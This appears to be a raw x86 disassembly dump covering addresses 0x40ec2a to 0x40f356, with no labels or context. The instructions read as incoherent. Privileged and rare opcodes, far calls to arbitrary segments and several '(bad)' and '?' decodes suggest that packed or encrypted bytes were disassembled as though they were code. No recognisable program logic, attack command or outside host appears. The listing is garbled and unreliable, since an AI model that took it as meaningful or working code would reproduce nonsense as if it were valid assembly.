  40ec2a:	scas   al,BYTE PTR es:[edi]
  40ec2b:	ret    0x41fd
  40ec2e:	cli    
  40ec2f:	fmul   st(1),st
  40ec31:	and    BYTE PTR [esi-0x2d9a41],0xd5
  40ec38:	int    0x4c
  40ec3a:	js     0x40ec1c
  40ec3c:	pop    esp
  40ec3d:	cmp    BYTE PTR [ecx+0x49],dh
  40ec40:	and    eax,0xafc4c434
  40ec46:	xchg   esi,eax
  40ec47:	mov    WORD PTR [edi+0x52cd715a],gs
  40ec4d:	in     eax,0x60
  40ec4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec50:	cmc    
  40ec51:	adc    al,0x5
  40ec53:	retf   
  40ec54:	les    eax,FWORD PTR [edx-0x6e]
  40ec57:	push   esi
  40ec58:	jae    0x40ec98
  40ec5a:	cmp    edi,DWORD PTR [esi+0x2f]
  40ec5d:	or     DWORD PTR [ebp+0x729da1b3],0xe5727021
  40ec67:	mov    DWORD PTR [edi],edi
  40ec69:	ss test al,0xeb
  40ec6c:	es pop es
  40ec6e:	or     eax,0xabb847a7
  40ec73:	in     eax,0x37
  40ec75:	mov    al,bh
  40ec77:	xor    al,0x93
  40ec79:	fbld   TBYTE PTR [esi+0x423f4930]
  40ec7f:	cmp    al,0xa1
  40ec81:	jmp    0x40eca6
  40ec83:	mov    ebp,0x75789c4
  40ec88:	or     al,0xd7
  40ec8a:	lods   al,BYTE PTR ds:[esi]
  40ec8b:	jecxz  0x40ec57
  40ec8d:	outs   dx,BYTE PTR ds:[esi]
  40ec8e:	loope  0x40ed0c
  40ec90:	xor    al,BYTE PTR [ebx+0x73]
  40ec93:	shl    ah,cl
  40ec95:	xchg   ebp,eax
  40ec96:	adc    DWORD PTR [eax+0x53],esp
  40ec99:	stc    
  40ec9a:	clc    
  40ec9b:	iret   
  40ec9c:	xchg   esi,eax
  40ec9d:	sti    
  40ec9e:	jl     0x40ed00
  40eca0:	and    ebx,edx
  40eca2:	adc    BYTE PTR [eax+ebp*2],0x3f
  40eca6:	cmp    al,0x27
  40eca8:	data16 sti 
  40ecaa:	fadd   DWORD PTR [ebp-0x12]
  40ecad:	lahf   
  40ecae:	jno    0x40ec3f
  40ecb0:	in     al,dx
  40ecb1:	cmp    DWORD PTR [edx-0x24216da4],esi
  40ecb7:	lock jbe 0x40ec81
  40ecba:	outs   dx,BYTE PTR ds:[esi]
  40ecbb:	and    al,0xbc
  40ecbd:	test   eax,0x6cf6ea01
  40ecc2:	or     BYTE PTR [eax+edi*2],bl
  40ecc5:	ja     0x40ecca
  40ecc7:	fsubr  st,st(2)
  40ecc9:	sub    eax,0x4f64cf78
  40ecce:	(bad)  
  40ecd0:	js     0x40ed3e
  40ecd2:	pop    ebx
  40ecd3:	popf   
  40ecd4:	ins    BYTE PTR es:[edi],dx
  40ecd5:	and    DWORD PTR [ebx+ebx*1+0x3c739307],ecx
  40ecdc:	mov    ebp,0xc41f7a3e
  40ece1:	sahf   
  40ece2:	(bad)  
  40ece4:	sub    DWORD PTR [edx],0xffffff84
  40ece7:	stos   DWORD PTR es:[edi],eax
  40ece8:	aad    0x9a
  40ecea:	cmp    BYTE PTR [edx-0x68],dl
  40eced:	and    edi,DWORD PTR [esi-0x27da38bc]
  40ecf3:	adc    esp,DWORD PTR [ebx]
  40ecf5:	xchg   edi,eax
  40ecf6:	push   0xfffffff1
  40ecf8:	call   0x7d2b:0x985d406e
  40ecff:	xchg   DWORD PTR [ebp+ebp*4+0x16],ebx
  40ed03:	inc    edi
  40ed04:	and    eax,0xffb80dba
  40ed09:	dec    esi
  40ed0a:	fucomi st,st(2)
  40ed0c:	xchg   edi,eax
  40ed0d:	lahf   
  40ed0e:	das    
  40ed0f:	mov    edi,eax
  40ed11:	mov    bl,BYTE PTR [esi+0x488d0cd8]
  40ed17:	hlt    
  40ed18:	mov    dh,0x40
  40ed1a:	sbb    bl,0x72
  40ed1d:	cmp    esp,DWORD PTR [esi-0x2f]
  40ed20:	cdq    
  40ed21:	mov    cl,0x97
  40ed23:	push   edx
  40ed24:	repz cmp al,0x1b
  40ed27:	aaa    
  40ed28:	rcl    DWORD PTR ds:0x43dcb1f6,0x79
  40ed2f:	jp     0x40ecdd
  40ed31:	xchg   edi,eax
  40ed32:	sub    dh,cl
  40ed34:	dec    ebp
  40ed35:	mov    bh,0x70
  40ed37:	xor    eax,DWORD PTR [esi-0x3d]
  40ed3a:	mov    ds:0x612ceeb8,al
  40ed3f:	hlt    
  40ed40:	inc    ebp
  40ed41:	int3   
  40ed42:	xor    DWORD PTR [ebp-0x2bbd75de],ebx
  40ed48:	or     ebx,DWORD PTR [edi]
  40ed4a:	daa    
  40ed4b:	jae    0x40edaf
  40ed4d:	sub    esp,esp
  40ed4f:	inc    ebp
  40ed50:	jg     0x40ed0a
  40ed52:	popa   
  40ed53:	dec    edx
  40ed54:	and    BYTE PTR [esi-0x5a67dff1],ch
  40ed5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed5b:	pop    edx
  40ed5c:	icebp  
  40ed5d:	call   0x12bd8c66
  40ed62:	ss push edx
  40ed64:	add    bl,0x5
  40ed67:	jl     0x40ed00
  40ed69:	or     al,0xf3
  40ed6b:	loopne 0x40ed8b
  40ed6d:	dec    ecx
  40ed6e:	mov    ecx,0xaea8477b
  40ed73:	mov    ah,0x14
  40ed75:	dec    esi
  40ed76:	pop    eax
  40ed77:	mov    edi,0x6362e426
  40ed7c:	push   cs
  40ed7d:	jmp    FWORD PTR [eax+0x1e66f81e]
  40ed83:	ins    DWORD PTR es:[edi],dx
  40ed84:	xor    esp,DWORD PTR fs:[esi]
  40ed87:	cmp    al,0xfe
  40ed89:	jb     0x40ed27
  40ed8b:	rcr    BYTE PTR [edi+0x26ce469b],1
  40ed91:	pop    es
  40ed92:	or     al,dh
  40ed94:	dec    edx
  40ed95:	push   edx
  40ed96:	dec    ebp
  40ed97:	leave  
  40ed98:	stc    
  40ed99:	cmp    DWORD PTR [edi],esi
  40ed9b:	sbb    eax,0x6ca32299
  40eda0:	das    
  40eda1:	mov    DWORD PTR [edi],ebx
  40eda3:	lods   al,BYTE PTR ds:[esi]
  40eda4:	pop    ebx
  40eda5:	push   ebx
  40eda6:	adc    ebp,edx
  40eda8:	mov    ch,0x92
  40edaa:	inc    edi
  40edab:	pop    ebx
  40edac:	dec    ecx
  40edad:	sbb    DWORD PTR [ecx],esp
  40edaf:	pop    ebp
  40edb0:	scas   eax,DWORD PTR es:[edi]
  40edb1:	jno    0x40ed6f
  40edb3:	push   esp
  40edb4:	and    DWORD PTR [edx],ecx
  40edb6:	pop    ebp
  40edb7:	inc    eax
  40edb8:	push   ebp
  40edb9:	icebp  
  40edba:	mov    ds:0xd5096eee,al
  40edbf:	pop    esp
  40edc0:	add    BYTE PTR [esi-0x6f8e19ba],al
  40edc6:	cwde   
  40edc7:	mov    esp,0x1284b9bf
  40edcc:	inc    ebx
  40edcd:	add    cl,dl
  40edcf:	mov    edx,0x6d653f1
  40edd4:	xor    al,0x30
  40edd6:	test   al,0x67
  40edd8:	mov    bl,0x8f
  40edda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eddb:	xor    DWORD PTR [edx+0x5c47ae25],eax
  40ede1:	aaa    
  40ede2:	pop    esi
  40ede3:	push   edx
  40ede4:	xchg   ebx,eax
  40ede5:	jmp    0x6af5d4
  40edea:	pop    esi
  40edeb:	test   ebx,ebx
  40eded:	fidiv  WORD PTR [esi]
  40edef:	scas   al,BYTE PTR es:[edi]
  40edf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edf1:	xchg   edi,eax
  40edf2:	cwde   
  40edf3:	or     DWORD PTR [eax+0x492bc225],edi
  40edf9:	cs mov edx,0x47e762a0
  40edff:	cmp    al,0xdc
  40ee01:	leave  
  40ee02:	fisttp WORD PTR [esi-0x37a85d]
  40ee08:	inc    eax
  40ee09:	or     BYTE PTR [eax+0x6603da26],0x54
  40ee10:	xchg   ecx,eax
  40ee11:	xchg   esi,eax
  40ee12:	adc    esi,ecx
  40ee14:	push   ds
  40ee15:	pop    ebp
  40ee16:	jbe    0x40ee91
  40ee18:	sbb    al,cl
  40ee1a:	add    ah,cl
  40ee1c:	cmp    BYTE PTR [ecx+0x144b1cf6],ch
  40ee22:	ins    BYTE PTR es:[edi],dx
  40ee23:	push   ebp
  40ee24:	push   DWORD PTR [edi+ebx*8]
  40ee27:	push   ss
  40ee28:	pop    ss
  40ee29:	adc    al,0x37
  40ee2b:	imul   BYTE PTR [ebx+edi*1+0x39e00117]
  40ee32:	stc    
  40ee33:	not    BYTE PTR [esi+0x1e29a859]
  40ee39:	(bad)  
  40ee3a:	pop    eax
  40ee3b:	mov    ebp,0x67f59d2a
  40ee40:	mov    eax,ecx
  40ee42:	mov    bl,0xff
  40ee44:	push   ebx
  40ee45:	xchg   edx,eax
  40ee46:	cmp    BYTE PTR [ebx-0x30233892],0xb3
  40ee4d:	imul   edi,DWORD PTR [eax],0xb45c95aa
  40ee53:	loopne 0x40ee60
  40ee55:	xchg   edx,eax
  40ee56:	aam    0x42
  40ee58:	test   al,0xe6
  40ee5a:	jp     0x40eebc
  40ee5c:	aas    
  40ee5d:	loopne 0x40ee79
  40ee5f:	mov    cs,WORD PTR [eax+0x9eedfca]
  40ee65:	push   ecx
  40ee66:	mov    ah,0xc9
  40ee68:	cli    
  40ee69:	xchg   ebp,eax
  40ee6a:	adc    DWORD PTR [edx+eiz*1+0x68],0x804b6f98
  40ee72:	xchg   esp,eax
  40ee73:	pop    esi
  40ee74:	sub    edx,DWORD PTR [ecx]
  40ee76:	sub    esp,esi
  40ee78:	mov    ah,0xe
  40ee7a:	jge    0x40ee84
  40ee7c:	out    dx,al
  40ee7d:	cmp    BYTE PTR ds:0xa26d8598,ah
  40ee83:	adc    al,0xc9
  40ee85:	adc    ebx,DWORD PTR [ebp+0x217c3bd1]
  40ee8b:	adc    eax,0x729d549a
  40ee90:	xchg   ebx,eax
  40ee91:	adc    BYTE PTR [esi],bh
  40ee93:	pop    edi
  40ee94:	lea    ebp,[ecx]
  40ee96:	sbb    edx,ecx
  40ee98:	xchg   bl,al
  40ee9a:	or     eax,0x1b7546fc
  40ee9f:	stc    
  40eea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eea1:	sbb    ah,BYTE PTR [edi]
  40eea3:	push   0x42
  40eea5:	add    BYTE PTR [edx+0x625d2240],ch
  40eeab:	aas    
  40eeac:	fs xchg esp,eax
  40eeae:	mov    esi,0xc64d0dca
  40eeb3:	cwde   
  40eeb4:	sub    al,0x34
  40eeb6:	adc    DWORD PTR [edx],esp
  40eeb8:	sbb    al,BYTE PTR [edx-0x21]
  40eebb:	pop    edi
  40eebc:	jmp    0x858b428f
  40eec1:	scas   al,BYTE PTR es:[edi]
  40eec2:	mov    esi,es
  40eec4:	sub    ecx,DWORD PTR [edi-0x4a]
  40eec7:	hlt    
  40eec8:	in     al,0x12
  40eeca:	outs   dx,DWORD PTR ds:[esi]
  40eecb:	dec    edx
  40eecc:	mov    eax,ds
  40eece:	and    ecx,eax
  40eed0:	mov    DWORD PTR [ebp+0x7d],esi
  40eed3:	in     eax,dx
  40eed4:	jg     0x40eeb4
  40eed6:	cs call 0x68a2cc7b
  40eedc:	fwait
  40eedd:	add    bh,bl
  40eedf:	adc    BYTE PTR [ecx],dh
  40eee1:	je     0x40ef03
  40eee3:	retf   
  40eee4:	pushf  
  40eee5:	into   
  40eee6:	icebp  
  40eee7:	fidiv  DWORD PTR [eax-0x5d]
  40eeea:	jmp    0x40ef0e
  40eeec:	pop    eax
  40eeed:	in     eax,dx
  40eeee:	jno    0x40eeda
  40eef0:	sub    DWORD PTR [eax],edi
  40eef2:	mov    edi,0x71489e79
  40eef7:	(bad)  
  40eef8:	jle    0x40eef8
  40eefa:	leave  
  40eefb:	test   BYTE PTR [esi+0x39181758],cl
  40ef01:	mov    ebp,0xb4c16ce7
  40ef06:	rol    BYTE PTR [ecx],1
  40ef08:	in     eax,dx
  40ef09:	add    ebp,DWORD PTR [ebx-0x51]
  40ef0c:	jnp    0x40ef23
  40ef0e:	jp     0x40eeb5
  40ef10:	ins    BYTE PTR es:[edi],dx
  40ef11:	iret   
  40ef12:	fcmovne st,st(4)
  40ef14:	aad    0x82
  40ef16:	dec    ebx
  40ef17:	pop    eax
  40ef18:	out    dx,al
  40ef19:	jl     0x40ef6f
  40ef1b:	ja     0x40ef18
  40ef1d:	das    
  40ef1e:	and    eax,0xbd637296
  40ef23:	pop    es
  40ef24:	imul   esp,DWORD PTR [edx],0x6d
  40ef27:	cmp    bh,BYTE PTR [edx]
  40ef29:	add    cl,dl
  40ef2b:	xlat   BYTE PTR ds:[ebx]
  40ef2c:	shl    DWORD PTR [ecx],1
  40ef2e:	jb     0x40ef48
  40ef30:	mov    dh,0xfc
  40ef32:	mov    bl,0x62
  40ef34:	popf   
  40ef35:	jbe    0x40ef90
  40ef37:	adc    al,0x56
  40ef39:	push   edx
  40ef3a:	loope  0x40ef0e
  40ef3c:	sub    dl,BYTE PTR [ebp+0x6c]
  40ef3f:	mov    ss,WORD PTR [esi+0x11]
  40ef42:	in     al,dx
  40ef43:	xchg   esp,eax
  40ef44:	mov    dh,0xe9
  40ef46:	xchg   ebp,eax
  40ef47:	test   ah,ch
  40ef49:	jb     0x40ef4b
  40ef4b:	cmc    
  40ef4c:	ror    al,cl
  40ef4e:	cli    
  40ef4f:	mov    eax,ds:0xd7b1e30e
  40ef54:	lods   al,BYTE PTR ds:[esi]
  40ef55:	fidivr DWORD PTR [esi]
  40ef57:	aaa    
  40ef58:	(bad)  
  40ef5a:	data16 or al,0x4d
  40ef5d:	outs   dx,DWORD PTR ds:[esi]
  40ef5e:	push   eax
  40ef5f:	rcr    BYTE PTR [esi],cl
  40ef61:	mov    al,0x1a
  40ef63:	jcxz   0x40efa9
  40ef66:	adc    BYTE PTR [ebx-0x4f84e14],ah
  40ef6c:	cmp    edx,edi
  40ef6e:	add    dl,al
  40ef70:	dec    edi
  40ef71:	sbb    edi,edi
  40ef73:	inc    esp
  40ef74:	inc    ebp
  40ef75:	push   ss
  40ef76:	cmc    
  40ef77:	mov    ch,0x27
  40ef79:	cmp    al,0x21
  40ef7b:	inc    esp
  40ef7c:	xlat   BYTE PTR ds:[ebx]
  40ef7d:	inc    esp
  40ef7e:	popf   
  40ef7f:	adc    BYTE PTR [edi],0x99
  40ef82:	(bad)  
  40ef83:	adc    eax,0x2a11c827
  40ef88:	cmp    ebp,DWORD PTR [eax-0xf]
  40ef8b:	(bad)  
  40ef8c:	sbb    al,0xb3
  40ef8e:	xor    eax,0x9e4c5478
  40ef93:	cmp    eax,0x5b3c5740
  40ef98:	(bad)  
  40ef99:	js     0x40ef91
  40ef9b:	ficom  WORD PTR [esi]
  40ef9d:	jno    0x40efe4
  40ef9f:	repnz mov esi,0xe6f7d521
  40efa5:	adc    DWORD PTR gs:[ebp-0x4548484c],0xd3e7cec5
  40efb0:	bound  edx,QWORD PTR [ecx+ebx*2]
  40efb3:	and    BYTE PTR [ebx-0x7070eb9f],0xc3
  40efba:	mov    cl,0x44
  40efbc:	aam    0xd8
  40efbe:	leave  
  40efbf:	mov    esp,0x34d49e8b
  40efc4:	lahf   
  40efc5:	xchg   ecx,eax
  40efc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efc7:	clc    
  40efc8:	xchg   DWORD PTR [edx+0x61bd46b5],esp
  40efce:	mov    ah,0x5a
  40efd0:	mov    DWORD PTR [ebx+0x265d258],0xa1d0a3ef
  40efda:	lods   eax,DWORD PTR ds:[esi]
  40efdb:	into   
  40efdc:	mov    dl,0xe1
  40efde:	mov    eax,ds:0x38aa46c6
  40efe3:	xchg   esp,eax
  40efe4:	outs   dx,BYTE PTR ds:[esi]
  40efe5:	sub    BYTE PTR [ecx+0x73cea67],dl
  40efeb:	mov    DWORD PTR [edx+0x71],ebp
  40efee:	out    0x7f,eax
  40eff0:	add    dl,BYTE PTR [ebp-0x58e38527]
  40eff6:	call   0xc3ea:0x558e6e3b
  40effd:	mov    edx,0xb5891ffe
  40f002:	leave  
  40f003:	ds pop ecx
  40f005:	cmp    edi,edi
  40f007:	pusha  
  40f008:	jl     0x40f000
  40f00a:	mov    esp,0x596f3bc0
  40f00f:	aas    
  40f010:	icebp  
  40f011:	adc    BYTE PTR ds:0x8255b064,dh
  40f017:	mov    edi,0x5f0bbb5d
  40f01c:	jle    0x40f02b
  40f01e:	inc    ecx
  40f01f:	push   cs
  40f020:	sub    bl,bh
  40f022:	push   ebp
  40f023:	jbe    0x40f01c
  40f025:	fcomp  DWORD PTR [esi+0x59]
  40f028:	fsqrt  
  40f02a:	mov    esp,0x58d0c73
  40f02f:	sub    eax,DWORD PTR [ecx]
  40f031:	mov    dh,0xba
  40f033:	clc    
  40f034:	lahf   
  40f035:	xor    ecx,edi
  40f037:	std    
  40f038:	mov    ds:0x45d91030,eax
  40f03d:	push   ds
  40f03e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f03f:	push   cs
  40f040:	lahf   
  40f041:	jno    0x40f069
  40f043:	xchg   ebp,eax
  40f044:	push   ds
  40f045:	xor    ebx,DWORD PTR [esi+eax*2]
  40f048:	shl    DWORD PTR [ebp-0x3ab7ad41],0x1d
  40f04f:	pop    esp
  40f050:	ds dec edx
  40f052:	rol    ecx,cl
  40f054:	mov    ch,0x7c
  40f056:	or     ebx,DWORD PTR [bp+si-0x7a]
  40f05a:	mov    bh,0xed
  40f05c:	jo     0x40f0be
  40f05e:	mov    al,0x68
  40f060:	inc    esi
  40f061:	jge    0x40efef
  40f063:	xchg   DWORD PTR [esi-0xa5e95d8],edi
  40f069:	jecxz  0x40f0ab
  40f06b:	pop    ss
  40f06c:	test   BYTE PTR [eax],dh
  40f06e:	sti    
  40f06f:	iret   
  40f070:	xor    eax,0xc91434dc
  40f075:	stc    
  40f076:	push   ebp
  40f077:	mov    eax,ds:0xf1a68543
  40f07c:	mov    bl,0x25
  40f07e:	jp     0x40f0ca
  40f080:	cmp    dh,BYTE PTR [ebx+0x30a7e097]
  40f086:	nop
  40f087:	fiadd  WORD PTR [eax+0x69]
  40f08a:	add    eax,0x5d35ef6e
  40f08f:	sub    bh,BYTE PTR [edx+ebx*1-0x7454deb0]
  40f096:	and    al,0x31
  40f098:	sbb    DWORD PTR [esi-0x2030e1b6],0x8971ca0
  40f0a2:	sub    eax,0x7251c3e3
  40f0a7:	and    eax,0x7a92959
  40f0ac:	fcomp  DWORD PTR [edi]
  40f0ae:	pop    ds
  40f0af:	push   edx
  40f0b0:	pop    eax
  40f0b1:	(bad)  
  40f0b2:	shl    DWORD PTR [edx+0x6b],0x94
  40f0b6:	cmp    eax,ebx
  40f0b8:	mov    ebx,ebp
  40f0ba:	jb     0x40f0c3
  40f0bc:	stos   DWORD PTR es:[edi],eax
  40f0bd:	pop    edi
  40f0be:	pop    esp
  40f0bf:	inc    ebp
  40f0c0:	xchg   edi,eax
  40f0c1:	popa   
  40f0c2:	(bad)  
  40f0c3:	int    0xd8
  40f0c5:	push   ecx
  40f0c6:	pop    ds
  40f0c7:	sub    eax,0xc8eb1028
  40f0cc:	into   
  40f0cd:	ja     0x40f0c8
  40f0cf:	cmp    eax,0xb13bd6f9
  40f0d4:	lods   al,BYTE PTR ds:[esi]
  40f0d5:	fs pop esp
  40f0d7:	lods   eax,DWORD PTR ds:[esi]
  40f0d8:	aaa    
  40f0d9:	jnp    0x40f0c8
  40f0db:	dec    esi
  40f0dc:	mov    ds:0xff5c9692,eax
  40f0e1:	add    DWORD PTR [eax-0x6b],ebx
  40f0e4:	lods   al,BYTE PTR ds:[esi]
  40f0e5:	pop    eax
  40f0e6:	jbe    0x40f083
  40f0e8:	cwde   
  40f0e9:	mov    esi,0x8479f3e1
  40f0ee:	push   cs
  40f0ef:	ficom  WORD PTR [esi]
  40f0f1:	add    eax,0xa297475b
  40f0f6:	inc    DWORD PTR [ecx]
  40f0f8:	sahf   
  40f0f9:	fsub   QWORD PTR [eax+eax*8+0x7d]
  40f0fd:	jge    0x40f0d4
  40f0ff:	xchg   ebx,eax
  40f100:	jns    0x40f116
  40f102:	mov    WORD PTR [ebp-0x869c291],gs
  40f108:	je     0x40f180
  40f10a:	test   DWORD PTR [ebx+0x1b5ae0f2],edi
  40f110:	loopne 0x40f0fd
  40f112:	mov    ebx,DWORD PTR [ebx+0x54618f89]
  40f118:	out    0x7f,al
  40f11a:	or     bh,BYTE PTR [eax+edx*2]
  40f11d:	xor    esp,DWORD PTR [edx-0x4]
  40f120:	std    
  40f121:	jns    0x40f0c4
  40f123:	jge    0x40f198
  40f125:	psubw  mm7,QWORD PTR [eax]
  40f128:	mov    dh,0xaa
  40f12a:	jae    0x40f0c2
  40f12c:	lods   al,BYTE PTR ds:[esi]
  40f12d:	cmp    eax,0xd00e08bf
  40f132:	outs   dx,BYTE PTR ds:[esi]
  40f133:	push   es
  40f134:	pop    DWORD PTR [edi+0x765bc6b5]
  40f13a:	retf   0x5f88
  40f13d:	mov    eax,ds:0x3397bfdf
  40f142:	(bad)  
  40f143:	mov    dh,0x4
  40f145:	cs ja  0x40f19e
  40f148:	call   0x36:0x1b52c631
  40f14f:	jecxz  0x40f12e
  40f151:	ja     0x40f1bf
  40f153:	test   BYTE PTR [edi],bl
  40f155:	pop    eax
  40f156:	push   ecx
  40f157:	xor    eax,0xfc43c9fc
  40f15c:	pushf  
  40f15d:	xor    dh,BYTE PTR [edi]
  40f15f:	loop   0x40f1a9
  40f161:	pop    ebx
  40f162:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f163:	xlat   BYTE PTR ds:[ebx]
  40f164:	retf   0xad8a
  40f167:	pushf  
  40f168:	int    0xe9
  40f16a:	push   es
  40f16b:	lds    ebx,FWORD PTR [eax]
  40f16d:	imul   ebp,DWORD PTR ds:0xe11c4be1,0xffffffa2
  40f174:	fnstcw WORD PTR [ecx+edx*1-0x1742c73b]
  40f17b:	ror    ecx,cl
  40f17d:	pop    ecx
  40f17e:	lea    ebx,[ebx+ebp*8+0x2c]
  40f182:	mov    WORD PTR [ecx],?
  40f184:	inc    ebx
  40f185:	js     0x40f1e6
  40f187:	push   edx
  40f188:	loop   0x40f121
  40f18a:	inc    edx
  40f18b:	jge    0x40f159
  40f18d:	sub    al,0xfc
  40f18f:	fld    TBYTE PTR [bx-0x43]
  40f193:	jo     0x40f1fd
  40f195:	leave  
  40f196:	dec    ecx
  40f197:	cmp    eax,DWORD PTR [ebx-0x31102ed]
  40f19d:	jns    0x40f183
  40f19f:	fs icebp 
  40f1a1:	ss add ebp,0x35de2f17
  40f1a8:	pushf  
  40f1a9:	jmp    0x3aab2861
  40f1ae:	add    DWORD PTR [ecx+edx*1],edi
  40f1b1:	xchg   edx,eax
  40f1b2:	inc    ecx
  40f1b3:	outs   dx,DWORD PTR ds:[esi]
  40f1b4:	mov    WORD PTR fs:0x67b9594a,gs
  40f1bb:	mov    ecx,0xeacceae6
  40f1c0:	mov    edx,0xd5e21bf7
  40f1c5:	imul   BYTE PTR [esi]
  40f1c7:	retf   
  40f1c8:	retf   
  40f1c9:	popf   
  40f1ca:	adc    DWORD PTR fs:[eax+0x15],ebx
  40f1ce:	sbb    ebp,DWORD PTR cs:[ebx-0x2e]
  40f1d2:	adc    eax,0xc95287c9
  40f1d7:	mov    bl,BYTE PTR [eax-0x18ae2375]
  40f1dd:	popf   
  40f1de:	mov    ch,ah
  40f1e0:	push   ebp
  40f1e1:	inc    edx
  40f1e2:	fst    QWORD PTR [esi-0x58]
  40f1e5:	js     0x40f218
  40f1e7:	sub    al,0x69
  40f1e9:	rcr    BYTE PTR [edi],1
  40f1eb:	test   DWORD PTR [ebx],0x72ee071d
  40f1f1:	and    eax,ebx
  40f1f3:	jb     0x40f234
  40f1f5:	xor    eax,0xb23fd74c
  40f1fa:	fcomi  st,st(6)
  40f1fc:	repnz fisubr WORD PTR [ebx+eiz*2+0x3e17fa2b]
  40f204:	dec    ebx
  40f205:	aaa    
  40f206:	sbb    ecx,DWORD PTR [ebx+0x5c99ff57]
  40f20c:	icebp  
  40f20d:	loopne 0x40f21d
  40f20f:	aam    0xcb
  40f211:	and    ah,cl
  40f213:	enter  0x5810,0x99
  40f217:	inc    ecx
  40f218:	sar    bh,cl
  40f21a:	add    al,0x54
  40f21c:	sub    eax,0x5d0553f0
  40f221:	adc    ebx,ebx
  40f223:	inc    edx
  40f224:	out    dx,eax
  40f225:	enter  0x59e8,0xa4
  40f229:	and    BYTE PTR [edi-0x3aa6386e],ch
  40f22f:	pop    eax
  40f230:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f231:	mov    ebp,0x28560220
  40f236:	xor    al,0x7c
  40f238:	sbb    al,0x6
  40f23a:	jge    0x40f286
  40f23c:	xchg   esi,eax
  40f23d:	sar    DWORD PTR [ebp+0x26],0x37
  40f241:	ret    0xbbf9
  40f244:	xchg   esi,eax
  40f245:	inc    edx
  40f246:	psubw  mm4,mm1
  40f249:	cpuid  
  40f24b:	cmp    eax,0x8c32f7c
  40f250:	ja     0x40f2c4
  40f252:	add    eax,0x5209ac69
  40f257:	nop
  40f258:	dec    esp
  40f259:	inc    edi
  40f25a:	mov    dl,0x56
  40f25c:	pusha  
  40f25d:	jecxz  0x40f264
  40f25f:	lods   eax,DWORD PTR ds:[esi]
  40f260:	sbb    BYTE PTR [eax],al
  40f262:	cs xchg ecx,eax
  40f264:	icebp  
  40f265:	gs daa 
  40f267:	mov    eax,?
  40f269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f26a:	lds    edi,FWORD PTR [edx]
  40f26c:	xchg   edi,eax
  40f26d:	push   esp
  40f26e:	jb     0x40f203
  40f270:	dec    esi
  40f271:	movlps QWORD PTR [ecx+0x4526082a],xmm3
  40f278:	push   esp
  40f279:	pop    eax
  40f27a:	jecxz  0x40f2db
  40f27c:	xor    al,0xfa
  40f27e:	pop    esi
  40f27f:	cmp    al,0xba
  40f281:	mov    WORD PTR [ecx+0x3b0f76ae],ss
  40f287:	mov    cl,BYTE PTR [edi+0x13bd737f]
  40f28d:	push   ebp
  40f28e:	xor    dh,ah
  40f290:	push   es
  40f291:	shl    DWORD PTR [ebp-0x640afd21],cl
  40f297:	push   0x6
  40f299:	jns    0x40f227
  40f29b:	mov    edx,DWORD PTR [edi]
  40f29d:	push   ecx
  40f29e:	sub    BYTE PTR [eax-0x3f9a187e],bl
  40f2a4:	aad    0xda
  40f2a6:	in     eax,dx
  40f2a7:	and    BYTE PTR [ebp-0x104502b2],0x16
  40f2ae:	inc    edx
  40f2af:	das    
  40f2b0:	in     eax,dx
  40f2b1:	dec    edi
  40f2b2:	dec    edx
  40f2b3:	adc    edi,DWORD PTR [esi+0x7fea8923]
  40f2b9:	scas   eax,DWORD PTR es:[edi]
  40f2ba:	cs xchg esi,eax
  40f2bc:	dec    edx
  40f2bd:	push   eax
  40f2be:	adc    bh,BYTE PTR [ebx+0x5]
  40f2c1:	imul   edi,eax,0x89e61dbd
  40f2c7:	ror    DWORD PTR [esi+0x658f8db3],1
  40f2cd:	daa    
  40f2ce:	push   ecx
  40f2cf:	sbb    al,0x33
  40f2d1:	aas    
  40f2d2:	aaa    
  40f2d3:	dec    esp
  40f2d4:	cwde   
  40f2d5:	cwde   
  40f2d6:	push   ebp
  40f2d7:	mov    BYTE PTR [edx+0x59],ch
  40f2da:	xchg   edx,eax
  40f2db:	fldz   
  40f2dd:	loopne 0x40f2af
  40f2df:	sbb    ebp,DWORD PTR [ecx+0x46]
  40f2e2:	imul   ebp,DWORD PTR [edi-0x1f],0x65
  40f2e6:	sbb    DWORD PTR [edi+0x42bc3587],esi
  40f2ec:	sar    BYTE PTR [esi],cl
  40f2ee:	mov    dh,0x87
  40f2f0:	dec    esp
  40f2f1:	or     al,0x79
  40f2f3:	stos   DWORD PTR es:[edi],eax
  40f2f4:	test   al,0xeb
  40f2f6:	ret    0x4560
  40f2f9:	adc    eax,0xf2804a8
  40f2fe:	(bad)  
  40f2ff:	popf   
  40f300:	xor    ch,bl
  40f302:	push   edi
  40f303:	and    ch,BYTE PTR [edx+0x17]
  40f306:	add    dl,BYTE PTR [edx+ebx*1-0x7fb96bcb]
  40f30d:	mov    bl,0xff
  40f30f:	xlat   BYTE PTR ds:[ebx]
  40f310:	mov    ds:0xae56cc5d,eax
  40f315:	stos   DWORD PTR es:[edi],eax
  40f316:	inc    esp
  40f317:	dec    ebx
  40f318:	sbb    edi,eax
  40f31a:	fsub   st(3),st
  40f31c:	popa   
  40f31d:	dec    ecx
  40f31e:	dec    ecx
  40f31f:	cmc    
  40f320:	xor    al,0x80
  40f322:	std    
  40f323:	in     eax,dx
  40f324:	arpl   WORD PTR [edi+ecx*2+0x10],dx
  40f328:	(bad)  
  40f329:	jl     0x40f2da
  40f32b:	out    dx,al
  40f32c:	aad    0x65
  40f32e:	pushf  
  40f32f:	inc    ebx
  40f330:	clc    
  40f331:	(bad)  
  40f332:	push   ebp
  40f333:	fs pop ecx
  40f335:	jne    0x40f317
  40f337:	adc    cl,BYTE PTR [edi-0xce47aed]
  40f33d:	cmp    edx,eax
  40f33f:	sbb    al,0x85
  40f341:	sti    
  40f342:	ret    
  40f343:	xchg   edx,eax
  40f344:	mov    dl,0xe6
  40f346:	xchg   esi,eax
  40f347:	fsubr  DWORD PTR [ecx+0x5f]
  40f34a:	jae    0x40f3b5
  40f34c:	sub    DWORD PTR [edi-0x7f],esi
  40f34f:	call   0x8a35:0xb946e00a
  40f356:	fistp  QWORD PTR [edx+0x10]
